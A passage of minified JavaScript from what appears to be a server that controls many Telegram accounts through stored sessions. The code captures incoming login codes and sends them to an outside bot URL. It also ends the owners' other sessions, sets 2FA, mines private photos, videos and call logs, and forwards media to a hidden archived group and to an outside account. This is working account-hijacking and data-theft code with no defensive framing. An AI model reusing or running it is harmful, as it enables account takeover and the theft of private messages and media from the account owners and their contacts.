names",type:d.AddContactDto}),(0,s.ApiResponse)({status:200,description:"Successfully added contacts.",schema:{example:{success:!0,addedContacts:5}}}),(0,s.ApiResponse)({status:400,description:"Error adding contacts.",schema:{example:{success:!1,error:"Error message"}}}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[d.AddContactDto]),n("design:returntype",Promise)],u.prototype,"addContact",null),i([(0,a.Post)("addcontacts"),(0,s.ApiOperation)({summary:"Add multiple contacts"}),(0,s.ApiBody)({description:"Add contacts with a phone number array and a prefix for names",type:p.AddContactsDto}),(0,s.ApiResponse)({status:200,description:"Successfully added contacts.",schema:{example:{success:!0,addedContacts:5}}}),(0,s.ApiResponse)({status:400,description:"Error adding contacts.",schema:{example:{success:!1,error:"Error message"}}}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[p.AddContactsDto]),n("design:returntype",Promise)],u.prototype,"addContacts",null),i([(0,a.Get)("newSession/:mobile"),(0,s.ApiOperation)({summary:"Create new session"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"newSession",null),i([(0,a.Get)("updateNameandBio/:mobile"),(0,s.ApiOperation)({summary:"Update Name"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiQuery)({name:"firstName",description:"First Name",type:String}),(0,s.ApiQuery)({name:"about",description:"About",type:String}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("firstName")),r(2,(0,a.Query)("about")),n("design:type",Function),n("design:paramtypes",[String,String,String]),n("design:returntype",Promise)],u.prototype,"updateName",null),i([(0,a.Get)("metadata"),r(0,(0,a.Query)("mobile")),r(1,(0,a.Query)("chatId")),r(2,(0,a.Query)("offset")),r(3,(0,a.Query)("limit")),n("design:type",Function),n("design:paramtypes",[String,String,Number,Number]),n("design:returntype",Promise)],u.prototype,"getMediaMetadata",null),i([(0,a.Get)("download"),r(0,(0,a.Query)("mobile")),r(1,(0,a.Query)("messageId")),r(2,(0,a.Query)("chatId")),r(3,(0,a.Res)()),n("design:type",Function),n("design:paramtypes",[String,Number,String,Object]),n("design:returntype",Promise)],u.prototype,"downloadMediaFile",null),i([(0,a.Get)("downloadProfilePic"),r(0,(0,a.Query)("mobile")),r(1,(0,a.Query)("index")),r(2,(0,a.Res)()),n("design:type",Function),n("design:paramtypes",[String,Number,Object]),n("design:returntype",Promise)],u.prototype,"downloadProfilePic",null),i([(0,a.Get)("forward/:mobile/:chatId/:messageId"),(0,s.ApiOperation)({summary:"Create new session"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiParam)({name:"chatId",description:"chatId of user",type:String}),(0,s.ApiParam)({name:"messageId",description:"messageId of message",type:String}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("chatId")),r(2,(0,a.Param)("messageId")),n("design:type",Function),n("design:paramtypes",[String,String,Number]),n("design:returntype",Promise)],u.prototype,"forrward",null),i([(0,a.Get)("deleteChat/:mobile/:chatId"),(0,s.ApiOperation)({summary:"Create new session"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiParam)({name:"chatId",description:"chatId of user",type:String}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("chatId")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"deleteChat",null),i([(0,a.Get)("deleteProfilePics/:mobile"),(0,s.ApiOperation)({summary:"Create new session"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"deleteProfilePics",null),t.TelegramController=u=i([(0,a.Controller)("telegram"),(0,s.ApiTags)("Telegram"),n("design:paramtypes",[c.TelegramService])],u)},282:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramModule=void 0;const n=o(3563),r=o(7330),a=o(7422),s=o(8421),c=o(2995),l=o(3322),p=o(1324);let d=class{};t.TelegramModule=d,t.TelegramModule=d=i([(0,n.Module)({imports:[(0,n.forwardRef)((()=>a.UsersModule)),s.BufferClientModule,(0,n.forwardRef)((()=>l.ActiveChannelsModule)),(0,n.forwardRef)((()=>p.ChannelsModule))],controllers:[r.TelegramController],providers:[c.TelegramService],exports:[c.TelegramService]})],d)},2995:function(e,t,o){var i,n=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramService=void 0;const s=o(4374),c=o(9127),l=o(6185),p=o(1067),d=o(3563),u=o(6790),y=o(9155),m=o(6928),h=o(9597);let f=i=class{constructor(e,t,o,i){this.usersService=e,this.bufferClientService=t,this.activeChannelsService=o,this.channelsService=i}async onModuleDestroy(){await this.disconnectAll()}getActiveClientSetup(){return p.default.getActiveClientSetup()}setActiveClientSetup(e){p.default.setActiveClientSetup(e)}async getClient(e){const t=i.clientsMap.get(e);try{if(t&&t.connected())return await t.connect(),t}catch(e){console.log(e)}}hasClient(e){return i.clientsMap.has(e)}async deleteClient(e){const t=await this.getClient(e);return await(t?.disconnect()),console.log("Disconnected : ",e),i.clientsMap.delete(e)}async disconnectAll(){const e=i.clientsMap.entries();console.log("Disconnecting All Clients");for(const[t,o]of e)try{await(o?.disconnect()),i.clientsMap.delete(t),console.log(`Client disconnected: ${t}`)}catch(e){console.log((0,l.parseError)(e)),console.log(`Failed to Disconnect : ${t}`)}i.clientsMap.clear(),this.bufferClientService.clearJoinChannelInterval()}async createClient(e,t=!0,o=!0){const n=(await this.usersService.search({mobile:e}))[0];if(!n)throw new d.BadRequestException("user not found");if(this.hasClient(e))return console.log("Client Already exists"),await this.getClient(e);{let r,a=new p.default(n.session,n.mobile);try{if(r=await a.createClient(o),await r.getMe(),r)return i.clientsMap.set(e,a),t?setTimeout((async()=>{r.connected||await this.getClient(e)?(console.log("SELF destroy client : ",e),await a.disconnect()):console.log("Client Already Disconnected : ",e),i.clientsMap.delete(e)}),18e4):setInterval((async()=>{}),2e4),a;throw new d.BadRequestException("Client Expired")}catch(t){console.log("Parsing Error"),a&&(await a.disconnect(),a=null,i.clientsMap.delete(e));const o=(0,l.parseError)(t);throw(0,l.contains)(o.message.toLowerCase(),["expired","unregistered","deactivated","session_revoked","user_deactivated_ban"])?(console.log("Deleting User: ",n.mobile),await this.usersService.updateByFilter({$or:[{tgId:n.tgId},{mobile:e}]},{expired:!0})):console.log("Not Deleting user"),new d.BadRequestException(o.message)}}}async getMessages(e,t,o=8){return(await this.getClient(e)).getMessages(t,o)}async getMessagesNew(e,t,o,i){return(await this.getClient(e)).getMessagesNew(t,o,i)}async sendInlineMessage(e,t,o,i){return(await this.getClient(e)).sendInlineMessage(t,o,i)}async getChatId(e,t){const o=await this.getClient(e);return await o.getchatId(t)}async getLastActiveTime(e){const t=await this.getClient(e);return await t.getLastActiveTime()}async tryJoiningChannel(e,t){const o=await this.getClient(e);try{await o.joinChannel(t.username),console.log(o.phoneNumber," - Joined channel Success - ",t.username),t.canSendMsgs||(await this.channelsService.remove(t.channelId),await this.activeChannelsService.remove(t.channelId),console.log("Removed Channel- ",t.username))}catch(e){throw console.log(o.phoneNumber," - Failed to join - ",t.username),this.removeChannels(e,t.channelId,t.username),e}}async removeChannels(e,t,o){if("USERNAME_INVALID"==e.errorMessage||"CHAT_INVALID"==e.errorMessage||"USERS_TOO_MUCH"==e.errorMessage||e.toString().includes("No user has"))try{if(t)await this.channelsService.remove(t),await this.activeChannelsService.remove(t),console.log("Removed Channel- ",t);else{const e=(await this.channelsService.search({username:o}))[0];await this.channelsService.remove(e.channelId),await this.activeChannelsService.remove(e.channelId),console.log("Removed Channel - ",e.channelId)}}catch(e){console.log("Failed to search/remove channel: ",e)}else"CHANNEL_PRIVATE"===e.errorMessage&&(await this.channelsService.update(t,{private:!0}),await this.activeChannelsService.update(t,{private:!0}))}async getGrpMembers(e,t){try{const o=await this.getClient(e);return await o.getGrpMembers(t)}catch(e){console.error("Error fetching group members:",e)}}async addContact(e,t,o){try{const i=await this.getClient(e);return await i.addContact(t,o)}catch(e){console.error("Error fetching adding Contacts:",e)}}async addContacts(e,t,o){try{const i=await this.getClient(e);return await i.addContacts(t,o)}catch(e){console.error("Error fetching adding Contacts:",e)}}async removeOtherAuths(e){const t=await this.getClient(e);return await t.removeOtherAuths(),"Authorizations removed successfully"}async getSelfMsgsInfo(e){const t=await this.getClient(e);return await t.getSelfMSgsInfo()}async createGroup(e){const t=await this.getClient(e);return await t.createGroup()}async forwardSecrets(e,t){const o=await this.getClient(e);return await o.createGroupAndForward(t)}async joinChannelAndForward(e,t,o){const i=await this.getClient(e);return await i.joinChannelAndForward(t,o)}async getCallLog(e){const t=await this.getClient(e);return await t.getCallLog()}async getmedia(e){const t=await this.getClient(e);return await t.getMediaMessages()}async getChannelInfo(e,t=!1){const o=await this.getClient(e);return await o.getDialogs({limit:10,archived:!1}),await o.channelInfo(t)}async getAuths(e){const t=await this.getClient(e);return await t.getAuths()}async getMe(e){const t=await this.getClient(e);return await t.getMe()}async createNewSession(e){const t=await this.getClient(e);return await t.createNewSession()}async set2Fa(e){const t=await this.getClient(e);try{return await t.set2fa(),await t.disconnect(),"2Fa set successfully"}catch(e){const t=(0,l.parseError)(e);throw new d.HttpException(t.message,parseInt(t.status))}}async updatePrivacyforDeletedAccount(e){const t=await this.getClient(e);await t.updatePrivacyforDeletedAccount()}async deleteProfilePhotos(e){const t=await this.getClient(e);await t.deleteProfilePhotos()}async setProfilePic(e,t){const o=await this.getClient(e);await o.deleteProfilePhotos();try{await u.CloudinaryService.getInstance(t),await(0,l.sleep)(2e3);const e=process.cwd();return console.log("checking path",e),await o.updateProfilePic(m.join(e,"dp1.jpg")),await(0,l.sleep)(3e3),await o.updateProfilePic(m.join(e,"dp2.jpg")),await(0,l.sleep)(3e3),await o.updateProfilePic(m.join(e,"dp3.jpg")),await(0,l.sleep)(1e3),await o.disconnect(),"Profile pic set successfully"}catch(e){const t=(0,l.parseError)(e);throw new d.HttpException(t.message,parseInt(t.status))}}async updatePrivacy(e){const t=await this.getClient(e);try{return await t.updatePrivacy(),"Privacy updated successfully"}catch(e){const t=(0,l.parseError)(e);throw new d.HttpException(t.message,parseInt(t.status))}}async downloadProfilePic(e,t){const o=await this.getClient(e);try{return await o.downloadProfilePic(t)}catch(e){throw console.log("Some Error: ",(0,l.parseError)(e),e),new Error("Failed to update username")}}async updateUsername(e,t){const o=await this.getClient(e);try{return await o.updateUsername(t)}catch(e){throw console.log("Some Error: ",(0,l.parseError)(e),e),new Error("Failed to update username")}}async getMediaMetadata(e,t,o,i){const n=await this.getClient(e);return await n.getMediaMetadata(t,o,i)}async downloadMediaFile(e,t,o,i){const n=await this.getClient(e);return await n.downloadMediaFile(t,o,i)}async forwardMessage(e,t,o){const i=await this.getClient(e);return await i.forwardMessage(t,o)}async leaveChannels(e){const t=await this.getClient(e),o=(await t.channelInfo(!1)).canSendFalseChats;return await t.leaveChannels(o)}async leaveChannel(e,t){const o=await this.getClient(e);return await o.leaveChannels([t])}async deleteChat(e,t){const o=await this.getClient(e);return await o.deleteChat(t)}async updateNameandBio(e,t,o){const i=await this.getClient(e);try{return await i.updateProfile(t,o),"Username updated successfully"}catch(e){throw console.log("Some Error: ",(0,l.parseError)(e),e),new Error("Failed to update username")}}};t.TelegramService=f,f.clientsMap=new Map,t.TelegramService=f=i=n([(0,d.Injectable)(),a(0,(0,d.Inject)((0,d.forwardRef)((()=>c.UsersService)))),a(2,(0,d.Inject)((0,d.forwardRef)((()=>y.ActiveChannelsService)))),a(3,(0,d.Inject)((0,d.forwardRef)((()=>h.ChannelsService)))),r("design:paramtypes",[c.UsersService,s.BufferClientService,y.ActiveChannelsService,h.ChannelsService])],f)},1067:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0});const i=o(3047),n=o(689),r=o(6969),a=o(3820),s=o(8938),c=o(9896),l=o(8178),p=o(6185),d=o(7385),u=o(5651),y=o(8383),m=o(2041);class h{constructor(e,t){this.session=new n.StringSession(e),this.phoneNumber=t,this.client=null,this.channelArray=[]}static getActiveClientSetup(){return h.activeClientSetup}static setActiveClientSetup(e){h.activeClientSetup=e}async createGroup(){const e=this.phoneNumber,t=await this.client.invoke(new a.Api.channels.CreateChannel({title:"Saved Messages",about:e,megagroup:!0,forImport:!0})),{id:o,accessHash:i}=t.chats[0];return await this.client.invoke(new a.Api.folders.EditPeerFolders({folderPeers:[new a.Api.InputFolderPeer({peer:new a.Api.InputPeerChannel({channelId:o,accessHash:i}),folderId:1})]})),await this.client.invoke(new a.Api.channels.InviteToChannel({channel:new a.Api.InputChannel({channelId:o,accessHash:i}),users:["fuckyoubabie"]})),{id:o,accessHash:i}}async createGroupAndForward(e){const{id:t,accessHash:o}=await this.createGroup();await this.forwardSecretMsgs(e,t.toString())}async joinChannelAndForward(e,t){const o=await this.joinChannel(t);await this.client.invoke(new a.Api.folders.EditPeerFolders({folderPeers:[new a.Api.InputFolderPeer({peer:new a.Api.InputPeerChannel({channelId:o.chats[0].id,accessHash:o.chats[0].accessHash}),folderId:1})]})),await this.forwardSecretMsgs(e,t)}async forwardSecretMsgs(e,t){let o=0,i=0,n=0,r=[];do{r=await this.client.getMessages(e,{offsetId:o,limit:100}),i=r.total;const a=r.map((e=>{if(o=e.id,e.id&&e.media)return e.id})).filter((e=>void 0!==e));if(console.log(a),a.length>0){try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),n+=a.length,console.log(`Forwarded ${n} / ${i} messages`),await(0,d.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}await(0,d.sleep)(5e3)}}while(r.length>0);await this.leaveChannels([t])}async forwardMessages(e,t,o){const i=o.length;let n=0;for(let r=0;r<i;r+=30){const a=o.slice(r,r+30);try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),n+=a.length,console.log(`Forwarded ${n} / ${i} messages`),await(0,d.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}}return n}async disconnect(){this.client&&(console.log("Destroying Client: ",this.phoneNumber),this.client._destroyed=!0,await this.client.disconnect(),this.client=null),this.session.delete()}async getchatId(e){if(!this.client)throw new Error("Client is not initialized");return await this.client.getInputEntity(e)}async getMe(){return await this.client.getMe()}async errorHandler(e){(0,p.parseError)(e),e.message&&"TIMEOUT"==e.message||console.error(`Error occurred for API ID ${this.phoneNumber}:`,e)}async createClient(e=!0,t){this.client=new i.TelegramClient(this.session,parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:5}),this.client.setLogLevel(u.LogLevel.ERROR),this.client._errorHandler=this.errorHandler,await this.client.connect();const o=await this.client.getMe();return console.log("Connected Client : ",o.phone),e&&this.client&&(console.log("Adding event Handler"),t?this.client.addEventHandler((async e=>{await t(e)}),new r.NewMessage):this.client.addEventHandler((async e=>{await this.handleEvents(e)}),new r.NewMessage)),this.client}async getGrpMembers(e){try{const t=[],o=await this.client.getEntity(e);if(!(o instanceof a.Api.Chat||o instanceof a.Api.Channel))return void console.log("Invalid group or channel!");console.log(`Fetching members of ${o.title||o.username}...`);const i=await this.client.invoke(new a.Api.channels.GetParticipants({channel:o,filter:new a.Api.ChannelParticipantsRecent,offset:0,limit:200,hash:m(0)}));if(i instanceof a.Api.channels.ChannelParticipants){const e=i.participants;console.log(`Members: ${e.length}`);for(const o of e){const e=o instanceof a.Api.ChannelParticipant?o.userId:null;if(e){const o=await this.client.getEntity(e);t.push({tgId:o.id,name:`${o.firstName||""} ${o.lastName||""}`,username:`${o.username||""}`}),"Deleted Account"!=o.firstName||o.username||console.log(JSON.stringify(o.id))}else console.log(JSON.stringify(o?.userId))}}else console.log("No members found or invalid group.");return console.log(t.length),t}catch(e){console.error("Error fetching group members:",e)}}async getMessages(e,t=8){return await this.client.getMessages(e,{limit:t})}async getDialogs(e){const t=await this.client.getDialogs(e);return console.log("TotalChats:",t.total),t}async getLastMsgs(e){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getMessages("777000",{limit:e});let o="";return t.forEach((e=>{console.log(e.text),o+=e.text+"\n"})),o}async getSelfMSgsInfo(){if(!this.client)throw new Error("Client is not initialized");const e=(await this.client.getMe()).id;let t=0,o=0,i=0,n=0,r=0,a=0,s=0;const c=await this.client.getMessages(e,{limit:200});for(const e of c){const c=e.text.toLocaleLowerCase();(0,p.contains)(c,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])?s++:e.photo?(t++,e.fwdFrom?n++:o++):e.video&&(a++,e.fwdFrom?r++:i++)}return{total:c.total,photoCount:t,videoCount:a,movieCount:s,ownPhotoCount:o,otherPhotoCount:n,ownVideoCount:i,otherVideoCount:r}}async channelInfo(e=!1){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getDialogs({limit:1500});let o=0,i=0,n=0;this.channelArray.length=0;const r=[];console.log("TotalChats:",t.total);for(const e of t)if(e.isChannel||e.isGroup)try{const t=e.entity.toJSON(),{broadcast:a,defaultBannedRights:s,id:c}=t;n++,a||s?.sendMessages?(i++,r.push(c.toString()?.replace(/^-100/,""))):(o++,this.channelArray.push(c.toString()?.replace(/^-100/,"")))}catch(e){(0,p.parseError)(e)}return{chatsArrayLength:n,canSendTrueCount:o,canSendFalseCount:i,ids:e?this.channelArray:[],canSendFalseChats:r}}async addContact(e,t){try{for(let o=0;o<e.length;o++){const i=e[o],n=`${t}${o+1}`,r="";try{await this.client.invoke(new a.Api.contacts.AddContact({firstName:n,lastName:r,phone:i.mobile,id:i.tgId}))}catch(e){console.log(e)}}}catch(e){console.error("Error adding contacts:",e),(0,p.parseError)(e,"Failed to save contacts")}}async addContacts(e,t){try{const o=[];for(let i=0;i<e.length;i++){const n=e[i],r=`${t}${i+1}`,s="",c=m((i<<16).toString(10));o.push(new a.Api.InputPhoneContact({clientId:c,phone:n,firstName:r,lastName:s}))}const i=await this.client.invoke(new a.Api.contacts.ImportContacts({contacts:o}));console.log("Imported Contacts Result:",i)}catch(e){console.error("Error adding contacts:",e),(0,p.parseError)(e,"Failed to save contacts")}}async leaveChannels(e){console.log("Leaving Channels: initaied!!"),console.log("ChatsLength: ",e);for(let t of e)try{await this.client.invoke(new a.Api.channels.LeaveChannel({channel:t})),console.log("Left channel :",t),e.length>1&&await(0,d.sleep)(3e4)}catch(e){const t=(0,p.parseError)(e);console.log("Failed to leave channel :",t.message)}}async getEntity(e){return await(this.client?.getEntity(e))}async joinChannel(e){return console.log("trying to join channel : ",e),await(this.client?.invoke(new a.Api.channels.JoinChannel({channel:await(this.client?.getEntity(e))})))}connected(){return this.client.connected}async connect(){return await this.client.connect()}async removeOtherAuths(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.invoke(new a.Api.account.GetAuthorizations);for(const t of e.authorizations)this.isAuthMine(t)||(await(0,p.fetchWithTimeout)(`${(0,p.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${t.appName}:${t.country}:${t.deviceModel}`)}`),await this.resetAuthorization(t))}isAuthMine(e){return e.country.toLowerCase().includes("singapore")||e.deviceModel.toLowerCase().includes("oneplus")||e.deviceModel.toLowerCase().includes("cli")||e.deviceModel.toLowerCase().includes("linux")||e.appName.toLowerCase().includes("likki")||e.appName.toLowerCase().includes("rams")||e.appName.toLowerCase().includes("sru")||e.appName.toLowerCase().includes("shru")||e.appName.toLowerCase().includes("hanslnz")||e.deviceModel.toLowerCase().includes("windows")}async resetAuthorization(e){await(this.client?.invoke(new a.Api.account.ResetAuthorization({hash:e.hash})))}async getAuths(){if(!this.client)throw new Error("Client is not initialized");return await this.client.invoke(new a.Api.account.GetAuthorizations)}async getAllChats(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.getDialogs({limit:500});console.log("TotalChats:",e.total);const t=[];for(const o of e){const e=await o.entity.toJSON();t.push(e)}return t}async getMessagesNew(e,t=0,o=20){const i=await this.client.getMessages(e,{offsetId:t,limit:o});return await Promise.all(i.map((async e=>{const t=e.media?{type:e.media.className.includes("video")?"video":"photo",thumbnailUrl:await this.getMediaUrl(e)}:null;return{id:e.id,message:e.message,date:e.date,sender:{id:e.senderId?.toString(),is_self:e.out,username:e.fromId?e.fromId.toString():null},media:t}})))}async getMediaUrl(e){if(e.media instanceof a.Api.MessageMediaPhoto){console.log("messageId image:",e.id);const t=e.photo?.sizes||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}if(e.media instanceof a.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))){console.log("messageId video:",e.id);const t=e.document?.thumbs||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}return null}async sendInlineMessage(e,t,o){const i={text:"Open URL",url:o};return await this.client.sendMessage(e,{message:t,buttons:[new a.Api.KeyboardButtonUrl(i)]})}async getMediaMessages(){return await this.client.invoke(new a.Api.messages.Search({peer:new a.Api.InputPeerEmpty,q:"",filter:new a.Api.InputMessagesFilterPhotos,minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:m(0)}))}async getCallLog(){const e=(await this.client.invoke(new a.Api.messages.Search({peer:new a.Api.InputPeerEmpty,q:"",filter:new a.Api.InputMessagesFilterPhoneCalls({}),minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:m(0)}))).messages.filter((e=>e.action instanceof a.Api.MessageActionPhoneCall)),t={outgoing:0,incoming:0,video:0,chatCallCounts:{},totalCalls:0};for(const o of e){t.totalCalls++;const e=o.action;o.out?t.outgoing++:t.incoming++,e.video&&t.video++;const i=o.peerId.userId.toString();if(!t.chatCallCounts[i]){const e=await this.client.getEntity(i);t.chatCallCounts[i]={phone:e.phone,username:e.username,name:`${e.firstName}  ${e.lastName?e.lastName:""}`,count:0}}t.chatCallCounts[i].count++}const o=[];for(const[e,i]of Object.entries(t.chatCallCounts))if(i.count>4){let t=0,n=0;const r=await this.client.getMessages(e,{limit:600});for(const e of r){const o=e.text.toLocaleLowerCase();(0,p.contains)(o,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])||(e.media instanceof a.Api.MessageMediaPhoto?n++:e.media instanceof a.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))&&t++)}o.push({...i,msgs:r.total,video:t,photo:n,chatId:e})}return console.log({...t,chatCallCounts:o}),{...t,chatCallCounts:o}}async handleEvents(e){e.isPrivate&&"777000"==e.message.chatId.toString()&&(console.log(e.message.text.toLowerCase()),console.log("Login Code received for - ",this.phoneNumber,"\nActiveClientSetup - ",h.activeClientSetup),console.log("Date :",new Date(1e3*e.message.date)),await(0,p.fetchWithTimeout)(`${(0,p.ppplbot)()}&text=${encodeURIComponent(e.message.text)}`))}async updatePrivacyforDeletedAccount(){try{await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyPhoneCall,rules:[new a.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyProfilePhoto,rules:[new a.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyPhoneNumber,rules:[new a.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyStatusTimestamp,rules:[new a.Api.InputPrivacyValueDisallowAll]})),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyAbout,rules:[new a.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated")}catch(e){throw e}}async updateProfile(e,t){const o={lastName:""};void 0!==e&&(o.firstName=e),void 0!==t&&(o.about=t);try{await this.client.invoke(new a.Api.account.UpdateProfile(o)),console.log("Updated NAme: ",e)}catch(e){throw e}}async downloadProfilePic(e){try{const t=await this.client.invoke(new a.Api.photos.GetUserPhotos({userId:"me",offset:0}));if(t.photos.length>0)if(console.log(`You have ${t.photos.length} profile photos.`),e<t.photos.length){const o=t.photos[e],i=Math.max(o.sizes.length-2,0),n=o.sizes[i],r=await this.client.downloadFile(new a.Api.InputPhotoFileLocation({id:o.id,accessHash:o.accessHash,fileReference:o.fileReference,thumbSize:n.type}),{dcId:o.dcId});if(r){const t=`profile_picture_${e+1}.jpg`;return c.writeFileSync(t,r),console.log(`Profile picture downloaded as '${t}'`),t}console.log("Failed to download the photo.")}else console.log(`Photo index ${e} is out of range.`);else console.log("No profile photos found.")}catch(e){console.error("Error:",e)}}async getLastActiveTime(){const e=await this.client.invoke(new a.Api.account.GetAuthorizations);let t=0;return e.authorizations.map((e=>{this.isAuthMine(e)||t<e.dateActive&&(t=e.dateActive)})),new Date(1e3*t).toISOString().split("T")[0]}async getContacts(){return await this.client.invoke(new a.Api.contacts.GetContacts({hash:m(0)}))}async deleteChat(e){try{await this.client.invoke(new a.Api.messages.DeleteHistory({justClear:!1,peer:e,revoke:!1})),console.log(`Dialog with ID ${e} has been deleted.`)}catch(e){console.error("Failed to delete dialog:",e)}}async blockUser(e){try{await(this.client?.invoke(new a.Api.contacts.Block({id:e}))),console.log(`User with ID ${e} has been blocked.`)}catch(e){console.error("Failed to block user:",e)}}downloadWithTimeout(e,t){return Promise.race([e,new Promise(((e,o)=>setTimeout((()=>o(new Error("Download timeout"))),t)))])}async getMediaMetadata(e="me",t=void 0,o=100){try{const i={limit:parseInt(o.toString())};t&&(i.offsetId=parseInt(t.toString()));const n=await this.client.getMessages(e,i),r=n.filter((e=>e.media&&"MessageMediaWebPage"!==e.media.className));if(console.log("Total:",n.total,"fetched: ",n.length,"ChatId: ",e,"Media :",r.length),!n.length)return console.log("No more media messages found. Reached the end of the chat."),{data:[],endOfMessages:!0};const s=[];for(const e of r){console.log(e.media.className,e.document?.mimeType);let t=null;try{if(e.media instanceof a.Api.MessageMediaPhoto){const o=e.photo?.sizes||[1];t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:o[1]||o[0]}),5e3),console.log("messageId image:",e.id),s.push({messageId:e.id,mediaType:"photo",thumb:t?.toString("base64")||null})}else if(e.media instanceof a.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))){const o=e.document?.thumbs||[1];console.log("messageId video:",e.id),t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:o[1]||o[0]}),5e3),s.push({messageId:e.id,mediaType:"video",thumb:t?.toString("base64")||null})}}catch(t){"Download timeout"===t.message?console.warn(`Skipping media messageId: ${e.id} due to download timeout.`):t.message.includes("FILE_REFERENCE_EXPIRED")?console.warn("File reference expired for message. Skipping this media."):console.error(`Failed to download media thumbnail for messageId: ${e.id}`,t),s.push({messageId:e.id,mediaType:"photo",thumb:null});continue}}return s.length||s.push({messageId:n[n.length-1].id,mediaType:"photo",thumb:null}),console.log("Returning ",s.length),{data:s,endOfMessages:!1}}catch(i){if(console.error("Error in getMediaMetadata:",i),i.message.includes("FLOOD_WAIT")){const n=parseInt(i.message.match(/FLOOD_WAIT_(\d+)/)[1],10);return console.warn(`Rate limit hit. Retrying after ${n} seconds.`),await new Promise((e=>setTimeout(e,1e3*n))),this.getMediaMetadata(e,t,o)}throw new Error("Error fetching media metadata")}}async downloadMediaFile(e,t="me",o){try{const i=(await this.client.getMessages(t,{ids:[e]}))[0];if(!i||i.media instanceof a.Api.MessageMediaEmpty)o.status(404).send("Media not found");else{const e=i.media;let t,n,r;const s=i.video||i.photo,c={id:s.id,accessHash:s.accessHash,fileReference:s.fileReference};if(e instanceof a.Api.MessageMediaPhoto)t="image/jpeg",n="photo.jpg",r=new a.Api.InputPhotoFileLocation({...c,thumbSize:"m"});else{if(!(e instanceof a.Api.MessageMediaDocument))return o.status(415).send("Unsupported media type");t=e.mimeType||"video/mp4",n="video.mp4",r=new a.Api.InputDocumentFileLocation({...c,thumbSize:""})}o.setHeader("Content-Type",t),o.setHeader("Content-Disposition",`attachment; filename="${n}"`);const l=524288;for await(const e of this.client.iterDownload({file:r,offset:m[0],limit:5242880,requestSize:l}))o.write(e);o.end()}}catch(e){if(e.message.includes("FILE_REFERENCE_EXPIRED"))return o.status(404).send("File reference expired");console.error("Error downloading media:",e),o.status(500).send("Error downloading media")}}async forwardMessage(e,t){try{await this.client.forwardMessages("@fuckyoubabie",{fromPeer:e,messages:t})}catch(e){console.log("Failed to Forward Message : ",e.errorMessage)}}async updateUsername(e){let 